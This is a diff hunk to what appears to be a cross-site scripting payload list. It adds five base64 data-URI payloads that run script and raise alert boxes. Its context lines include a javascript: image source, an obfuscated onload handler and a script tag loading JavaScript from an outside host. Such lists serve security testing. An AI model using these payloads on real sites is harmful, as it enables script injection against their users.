@@ -27,3 +27,8 @@ data:text/html;base64,PGJvZHkgb25sb2FkPSJhbGVydCgnUGF5bG9hZCcpIj48L2JvZHk+
 <IMG SRC="javascript:alert('XSS');">
 <BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>
 <SCRIPT/XSS SRC="http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT>
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPjxoMT5FbnZpcm9ubWVudCBNZXNzYWdlPC9oMT48c2NyaXB0PmFsZXJ0KCdFbnZpcm9ubWVudCBtZXNzYWdlIGZvciBmYWN0aW9uJyk7PC9zY3JpcHQ+
+data:text/html;base64,PG1ldGEgbmFtZT0iZGV2aWNlLXdpZHRoIiBjb250ZW50PSIxMjAwIj48c2NyaXB0PmFsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIDEyMDAgcGl4ZWwgd2lkdGgnKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5iYWNrZ3JvdW5kPSdyZWQnO2FsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIHJlZCBiYWNrZ3JvdW5kJyk7PC9zY3JpcHQ+
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LmJhY2tncm91bmRDb2xvcj0nZ3JlZW4nO2FsZXJ0KCdGZWN0aWFsIE1lc3NhZ2UgZm9yIGdyZWVuIGJhY2tncm91bmQnKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LnN0eWxlLmZvbnRTaXplPScyMHB4JzthbGVydCgnRmVjdGlhbCBNZXNzYWdlIGZvciAyMHB4IGZvbnQgc2l6ZScpOzwvc2NyaXB0Pg==
